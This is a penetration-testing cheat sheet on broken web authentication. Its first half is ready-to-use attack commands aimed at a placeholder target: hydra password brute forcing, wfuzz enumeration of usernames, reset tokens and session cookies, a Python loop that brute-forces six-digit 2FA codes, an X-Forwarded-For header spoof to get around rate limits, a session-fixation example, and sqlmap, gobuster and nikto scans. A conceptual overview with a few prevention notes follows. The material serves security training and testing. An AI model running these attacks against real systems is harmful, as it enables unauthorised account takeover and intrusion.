# Broken Authentication

### User Enumeration

#### Using Nmap (Replace target.com and port with your target)

```bash
nmap -p <port> --script http-enum-users.nse target.com
```

#### Using Wfuzz (Replace USERNAME\_LIST with a wordlist)

```bash
wfuzz -c -z file,USERNAME_LIST -w target.com/login?username=FUZZ
```

### Brute-Forcing Passwords

#### Using Hydra (Replace username, password\_list, and target)

```bash
hydra -l username -P password_list target.com http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid username or password"
```

#### Using Hashcat (For Offline Password Cracking)

```bash
hashcat -m <hash_type> <hash_file> <wordlist>
```

### Brute-Forcing Password Reset Tokens

#### Using Wfuzz (Replace TOKEN\_LIST)

```bash
wfuzz -c -z file,TOKEN_LIST target.com/reset?token=FUZZ
```

### Brute-Forcing 2FA Codes

#### Using a Custom Script (Python Example)

```python
import itertools
import requests

url = "https://target.com/2fa"
headers = {"Content-Type": "application/json"}

for code in itertools.product("0123456789", repeat=6):
    payload = {"otp": "".join(code)}
    response = requests.post(url, json=payload, headers=headers)
    if "success" in response.text:
        print("Valid 2FA Code Found:", "".join(code))
        break
```

### Bypassing Brute-Force Protection (X-Forwarded-For)

#### Using Curl (Modify Headers)

```bash
curl -H "X-Forwarded-For: 1.2.3.4" target.com/login
```

### Session Attacks

#### Brute-Forcing Cookies (Using Wfuzz, Very Time Consuming)

_(Replace COOKIE\_LIST)_

```bash
wfuzz -c -b "sessionid=FUZZ" target.com/protected_page -z file,COOKIE_LIST
```

#### Example of Session Fixation

**Attacker Sets Session ID:**

```bash
curl -b "sessionid=attacker_session_id" target.com
```

_Then coerces the victim to use that same session ID._

### Additional Examples

#### Nmap Scan

```bash
nmap -sV -sC target.com # Version and default scripts.
```

#### Directory Brute Force

```bash
gobuster dir -u target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
```

#### SQLMap Scan

```bash
sqlmap -u "target.com/page.php?id=1" --dbs # Database Enumeration
```

#### Nikto Scan

```bash
nikto -h target.com
```

#### Burp Suite Intruder Attack for Fuzzing

_Burp Suite is a GUI tool but provides many command-line options._

### Categories of Authentication

#### Knowledge

* **Passwords, PINs, Security Questions.**
* Password complexity policies, password storage (hashing, salting), and password managers.

#### Ownership

* **ID Cards, TOTP (Time-based One-Time Password), Hardware Tokens.**
* The TOTP algorithm, U2F/FIDO2 keys, and smart cards.

#### Inherence

* **Biometric Authentication (Fingerprint, Facial Recognition, Iris Scan).**
* Accuracy and security of different biometric methods, vulnerabilities like spoofing.

### Brute-Force Attacks

#### User Enumeration

* Identifying valid usernames.
* Common techniques include response time analysis, error message analysis, and social engineering.

#### Brute-Forcing Passwords

* Trying multiple password combinations.
* Dictionary attacks, hybrid attacks, and rainbow table attacks. Tools like Hydra and Hashcat.

#### Brute-Forcing Password Reset Tokens

* Trying different reset token values.
* Weak or predictable token generation exploitation.

#### Brute-Forcing 2FA Codes

* Trying many 2FA code combinations.
* Time window vulnerabilities, rate limiting importance.

### Bypassing Brute-Force Protection

#### Rate Limit

* **X-Forwarded-For HTTP Header Manipulation.**
* Other header manipulations and distributed brute-force attacks.

#### CAPTCHAs

* Looking for CAPTCHA solutions in HTML code.
* CAPTCHA bypass techniques and machine learning for solving.

### Password Attacks

#### Default Credentials

* **Sources:** [CIRT.ne](https://www.cirt.net/passwords)t, [SecLists Default Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials), [SCADA](https://github.com/scadastrangelove/SCADAPASS/tree/master).
* Changing default credentials immediately.

#### Vulnerable Password Reset

* **Issues:** Guessable security questions, username injection in reset requests.
* Importance of strong security questions and robust reset mechanisms.

### Authentication Bypasses

#### Accessing Protected Pages Directly

* Improper access control vulnerabilities.

#### Manipulating HTTP Parameters

* Parameter tampering and SQL injection.

### Session Attacks

#### Brute-Forcing Cookies with Insufficient Entropy

* Importance of cryptographically secure session ID generation.

#### Session Fixation

1. Attacker obtains a valid session identifier.
2. Attacker coerces the victim to use this session identifier (social engineering).
3. Victim authenticates to the vulnerable web application.
4. Attacker hijacks the victim's session.

* Prevention: Regenerating session IDs after login.

#### Improper Session Timeout

* Sessions should expire after an appropriate time interval.
* Best practices for session timeout management and secure session storage.

### Additional Considerations

* **MFA Implementation Flaws:** Weak MFA can lead to vulnerabilities.
* **WAF Bypasses:** Attackers may bypass WAFs to exploit authentication vulnerabilities.
* **OAuth/OpenID Connect Vulnerabilities:** Misconfigurations can lead to account takeover.
* **JWT Vulnerabilities:** Weak validation can result in security issues.
* **SSO Vulnerabilities:** Weak SSO implementations can compromise multiple applications.
* **Client-Side Vulnerabilities:** Storing sensitive data locally, client-side validation bypasses.
